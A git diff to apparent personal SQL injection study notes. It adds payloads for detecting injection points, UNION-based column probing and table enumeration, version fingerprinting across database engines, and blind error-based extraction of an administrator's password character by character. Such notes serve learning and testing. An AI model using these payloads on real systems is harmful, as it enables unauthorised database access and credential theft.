@@ -1,27 +1,35 @@
 # Entry point
-if the response is unchanged after one of these payloads (or an error is returned) - the parameter might be vulnerable to SQLi.
+if data is returned in the response, and it is unchanged after appending one of these payloads (or an error is returned) - the parameter might be vulnerable to SQLi.
 
 Oracle / MSSQL / PostgreSQL / MySQL / SQLite
 ```
- -- 
-' -- 
-" -- 
+ --
+; -- 
+' --
+'; -- 
+" --
+"; -- 
  /*
-' /* 
-" /* 
+' /*
+'; /* 
+" /*
+"; /* 
 ```
 MySQL
 ```
- # 
-' # 
-" # 
+ #
+; # 
+' #
+'; # 
+" #
+"; # 
 ```
 example query: SELECT role,fullname FROM users WHERE id='1' # '
 # UNION attack
 if data is returned in the response, the database can be enumerated using a union attack.
 in this case, the first step is to figure out how many columns are returned by the query.
 personally I like to supply an id or a username that does not exist so no row is returned,
-and then unioning a row of my choice until it is returned by the application:
+and then unioning a row of my choice until data is returned by the application:
 ```
 -1' UNION SELECT 1; # 
 -1' UNION SELECT 1,2: # 
@@ -32,27 +40,22 @@ other builtin methods and attributes to further enumerate the database.
 
 ```diff
 SELECT name,issue_date,valid_until FROM tickets WHERE ticket_id="
-- 1" UNION SELECT 1,2,3 /*
+- 1" UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR '<br>') ,3 FROM information_schema.tables /*
 "
 ```
 # Version enumeration
-
-PostgreSQL / MySQL / MariaDB
 ```
-SELECT version()
+SELECT version() # PostgreSQL / MySQL / MariaDB
+SELECT @@version -- MSSQL + # MySQL
+SELECT sqlite_version() /* SQLite
+SELECT banner FROM v$version -- Oracle
+SELECT version FROM v$instance -- Oracle
 ```
-MSSQL / MySQL
+# Blind
+if data is not directly returned in the response, we can trigger conditional errors or time delays, using stacked queries, concatenated strings and union attacks:
 ```
-SELECT @@version
-```
-SQLite
-```
-SELECT sqlite_version()
-```
-Oracle
-```
-SELECT banner FROM v$version
-SELECT version FROM v$instance
+' UNION SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator'-- -
+' UNION SELECT CASE WHEN SUBSTR(password,§1§,1)='§char§' THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator'-- - cluster bomb with number list and bruteforcer
 ```
 
 # Data exfiltration
